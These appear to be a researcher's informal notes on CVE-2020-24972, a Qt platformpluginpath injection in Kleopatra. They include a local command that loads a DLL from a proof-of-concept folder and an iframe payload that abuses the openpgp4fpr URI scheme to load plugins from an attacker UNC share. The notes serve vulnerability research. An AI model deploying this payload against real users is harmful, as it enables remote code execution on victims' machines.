So CVE-2020-24972 spans from another cve in actually. I don't remember the cve that got designated but it has to do with platformpluginpath cmdline option from qt. So in essence the problem comes from using qt, persee the option platformpluginpath . "This parameter is supposed to contain a directory path or UNC share pointing to Qt5 plugins. In other words, the target location should contain Dynamic Link Library (DLL) files on Windows. The Qt5 application, depending on certain metadata, will automatically execute those plugins as soon as they are loaded in memory." - zdi

So when a custom URI scheme is configured this can be exploited.

such we can run kleopatra.exe -platformpluginpath C:/Users/research/Desktop/poc to load and execute dll

Such we can derive since the were similar issues(cve's) from this blogpost https://www.zerodayinitiative.com/blog/2019/4/3/loading-up-a-pair-of-qt-bugs-detailing-cve-2019-1636-and-cve-2019-6739

<iframe src='openpgp4fpr: --platformpluginpath \\attacker-IP\share'>

need to add more details and test poc for later...
https://jeffs.sh/CVEs/CVE-2020-14049.txt
